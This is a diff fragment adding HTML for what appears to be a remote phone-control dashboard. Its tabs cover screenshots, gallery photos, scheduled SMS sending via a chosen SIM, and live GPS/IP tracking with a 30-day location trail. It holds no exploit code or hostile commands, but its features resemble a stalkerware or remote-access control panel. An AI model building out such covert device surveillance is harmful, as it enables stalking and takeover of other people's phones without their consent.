+        <div class="tab-pagination" id="galleryPagination"></div>
+      </div>
+
+      <!-- ===== TAB: SCREEN CAPTURES ===== -->
+      <div class="device-tab-content" id="tab-screen">
+        <div class="screen-capture-header">
+          <button class="btn btn-primary btn-sm" onclick="requestScreenCapture()" id="screenCaptureBtn">
+            <i class="ri-screenshot-line"></i> Take Screenshot
+          </button>
+          <span class="screen-capture-count" id="screenCaptureCount"></span>
+          <span class="screen-capture-status" id="screenCaptureStatus"></span>
+        </div>
+        <div class="gallery-grid-container" id="screenCaptureGrid">
+          <div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading captures...</span></div>
+        </div>
+        <div class="tab-pagination" id="screenCapturePagination"></div>
+      </div>
+
+      <!-- ===== TAB: SCHEDULED COMMANDS ===== -->
+      <div class="device-tab-content" id="tab-schedule">
+        <div class="schedule-header">
+          <button class="btn btn-primary btn-sm" onclick="openScheduleForm()" id="scheduleNewBtn">
+            <i class="ri-add-line"></i> New Scheduled Command
+          </button>
+          <button class="btn btn-sm" onclick="clearExecutedCommands()" title="Clear executed/failed">
+            <i class="ri-delete-bin-line"></i> Clear History
+          </button>
+          <span class="schedule-count" id="scheduleCount"></span>
+        </div>
+
+        <!-- Schedule Create Form (hidden by default) -->
+        <div class="schedule-form hidden" id="scheduleForm">
+          <div class="schedule-form-header">
+            <i class="ri-calendar-schedule-line"></i>
+            <span>SCHEDULE A COMMAND</span>
+            <button class="schedule-form-close" onclick="closeScheduleForm()"><i class="ri-close-line"></i></button>
+          </div>
+          <div class="schedule-form-body">
+            <div class="sms-field">
+              <label><i class="ri-command-line"></i> Command Type</label>
+              <select id="schedCmdType" onchange="onScheduleCmdTypeChange()">
+                <option value="send_sms">Send SMS</option>
+                <option value="screen_capture">Screen Capture</option>
+              </select>
+            </div>
+            <div class="sms-field">
+              <label><i class="ri-time-line"></i> Scheduled At (UTC)</label>
+              <input type="datetime-local" id="schedDateTime" step="60">
+            </div>
+            <!-- SMS-specific fields -->
+            <div id="schedSmsFields">
+              <div class="sms-field">
+                <label><i class="ri-phone-line"></i> Receiver</label>
+                <input type="text" id="schedSmsReceiver" placeholder="e.g. +919876543210">
+              </div>
+              <div class="sms-field">
+                <label><i class="ri-message-3-line"></i> Message</label>
+                <textarea id="schedSmsMessage" rows="2" placeholder="Type message..."></textarea>
+              </div>
+              <div class="sms-field">
+                <label><i class="ri-sim-card-2-line"></i> SIM Slot</label>
+                <select id="schedSimSlot">
+                  <option value="1">SIM 1</option>
+                  <option value="2">SIM 2</option>
+                </select>
+              </div>
+            </div>
+            <button class="btn btn-primary btn-sm" onclick="submitScheduledCommand()">
+              <i class="ri-check-line"></i> Schedule
+            </button>
+          </div>
+        </div>
+
+        <div class="tab-list-container" id="scheduleListContainer">
+          <div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading scheduled commands...</span></div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ═══ GALLERY LIGHTBOX ═══ -->
+  <div class="gallery-lightbox hidden" id="galleryLightbox" onclick="closeGalleryLightbox(event)">
+    <div class="gallery-lightbox-inner">
+      <button class="gallery-lb-close" onclick="closeGalleryLightbox()"><i class="ri-close-line"></i></button>
+      <button class="gallery-lb-nav gallery-lb-prev" onclick="galleryLightboxNav(-1)"><i class="ri-arrow-left-s-line"></i></button>
+      <img id="galleryLightboxImg" src="" alt="Gallery photo">
+      <button class="gallery-lb-nav gallery-lb-next" onclick="galleryLightboxNav(1)"><i class="ri-arrow-right-s-line"></i></button>
+      <div class="gallery-lb-info" id="galleryLightboxInfo"></div>
+    </div>
+  </div>
+
+  <!-- ═══ METRICS DETAIL OVERLAY (3D slide-in) ═══ -->
+  <div class="metrics-overlay hidden" id="metricsOverlay">
+    <div class="metrics-detail-panel" id="metricsDetailPanel">
+      <div class="mdp-header">
+        <div class="mdp-title">
+          <i class="ri-pulse-line"></i>
+          <span id="mdpTitle">NETWORK DIAGNOSTICS</span>
+          <span class="mdp-live">● LIVE</span>
+        </div>
+        <button class="btn-icon" onclick="closeMetricsDetail()"><i class="ri-close-line"></i></button>
+      </div>
+      <div class="mdp-body" id="mdpBody">
+        <!-- Dynamic content injected by JS -->
+      </div>
+    </div>
+  </div>
+
+  <!-- Toast Container -->
+  <div id="toastContainer" class="toast-wrap"></div>
+
+  <!-- ═══ GEO TRACKER — FULLSCREEN MAP PANEL ═══ -->
+  <div class="geo-overlay hidden" id="geoOverlay">
+    <div class="geo-panel">
+      <!-- Map container -->
+      <div id="geoMap" class="geo-map"></div>
+
+      <!-- Top bar -->
+      <div class="geo-topbar">
+        <div class="geo-topbar-left">
+          <button class="geo-close-btn" onclick="closeGeoPanel()"><i class="ri-arrow-left-s-line"></i></button>
+          <div class="geo-device-info">
+            <span class="geo-device-name" id="geoDeviceName">—</span>
+            <span class="geo-device-status" id="geoDeviceStatus"><span class="geo-live-dot"></span> TRACKING</span>
+          </div>
+        </div>
+        <div class="geo-topbar-right">
+          <div class="geo-source-badge" id="geoSourceBadge" style="display:none">
+            <i class="ri-signal-wifi-line"></i> <span id="geoSourceText">GPS</span>
+          </div>
+          <div class="geo-coords" id="geoCoords">—</div>
+        </div>
+      </div>
+
+      <!-- Floating info card -->
+      <div class="geo-info-card" id="geoInfoCard">
+        <div class="geo-info-row"><i class="ri-map-pin-line"></i><span id="geoAddress">Locating...</span></div>
+        <div class="geo-info-row"><i class="ri-building-line"></i><span id="geoCityCountry">—</span></div>
+        <div class="geo-info-row"><i class="ri-signal-tower-line"></i><span id="geoAccuracy">—</span></div>
+        <div class="geo-info-row"><i class="ri-global-line"></i><span id="geoIsp">—</span></div>
+        <div class="geo-info-row"><i class="ri-time-line"></i><span id="geoLastUpdate">—</span></div>
+        <div class="geo-info-row"><i class="ri-speed-line"></i><span id="geoSpeed">—</span></div>
+        <div class="geo-info-row"><i class="ri-wifi-line"></i><span id="geoIpAddress">—</span></div>
+      </div>
+
+      <!-- Layer controls -->
+      <div class="geo-layer-panel" id="geoLayerPanel">
+        <button class="geo-layer-btn active" data-layer="satellite" onclick="switchGeoLayer('satellite', this)"><i class="ri-earth-line"></i> Satellite</button>
+        <button class="geo-layer-btn" data-layer="hybrid" onclick="switchGeoLayer('hybrid', this)"><i class="ri-map-2-line"></i> Hybrid</button>
+        <button class="geo-layer-btn" data-layer="streets" onclick="switchGeoLayer('streets', this)"><i class="ri-road-map-line"></i> Streets</button>
+        <button class="geo-layer-btn" data-layer="dark" onclick="switchGeoLayer('dark', this)"><i class="ri-moon-line"></i> Dark</button>
+        <button class="geo-layer-btn" data-layer="terrain" onclick="switchGeoLayer('terrain', this)"><i class="ri-landscape-line"></i> Terrain</button>
+      </div>
+
+      <!-- Street View + CCTV + Flight + History Trail toggles -->
+      <div class="geo-feature-toggles">
+        <button class="geo-feature-btn" id="geoStreetViewBtn" onclick="openStreetView()" title="Street View"><i class="ri-road-map-line"></i></button>
+        <button class="geo-feature-btn" id="geoWebcamBtn" onclick="toggleWebcamLayer()" title="Live CCTV/Webcams"><i class="ri-camera-line"></i></button>
+        <button class="geo-feature-btn" id="geoFlightBtn" onclick="toggleFlightLayer()" title="Live Flights"><i class="ri-flight-takeoff-line"></i></button>
+        <button class="geo-feature-btn" id="geoHistoryBtn" onclick="toggleLocationHistory()" title="Location History Trail"><i class="ri-route-line"></i></button>
+      </div>
+
+      <!-- Location History Trail controls -->
+      <div class="geo-history-panel hidden" id="geoHistoryPanel">
+        <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px;">
+          <i class="ri-route-line" style="color:var(--accent);font-size:16px;"></i>
+          <span style="font-size:12px;font-weight:700;letter-spacing:0.5px;color:var(--text);">HISTORY TRAIL</span>
+          <span id="geoHistoryCount" style="font-size:11px;color:var(--muted);margin-left:auto;">0 points</span>
+        </div>
+        <div style="display:flex;gap:6px;flex-wrap:wrap;">
+          <button class="geo-history-range-btn active" data-hours="1" onclick="loadLocationHistory(1, this)">1H</button>
+          <button class="geo-history-range-btn" data-hours="6" onclick="loadLocationHistory(6, this)">6H</button>
+          <button class="geo-history-range-btn" data-hours="24" onclick="loadLocationHistory(24, this)">24H</button>
+          <button class="geo-history-range-btn" data-hours="72" onclick="loadLocationHistory(72, this)">3D</button>
+          <button class="geo-history-range-btn" data-hours="168" onclick="loadLocationHistory(168, this)">7D</button>
+          <button class="geo-history-range-btn" data-hours="720" onclick="loadLocationHistory(720, this)">30D</button>
+        </div>
+      </div>
+
+      <!-- Street View container -->
+      <div class="geo-street-view hidden" id="geoStreetView"></div>
+
+      <!-- Zoom controls -->
+      <div class="geo-zoom-controls">
+        <button onclick="geoZoomIn()"><i class="ri-add-line"></i></button>
+        <button onclick="geoZoomOut()"><i class="ri-subtract-line"></i></button>
+        <button onclick="geoCenterDevice()"><i class="ri-focus-3-line"></i></button>
+      </div>
+    </div>
+  </div>
+
+  <script src="app.js"></script>
+</body>
+</html>
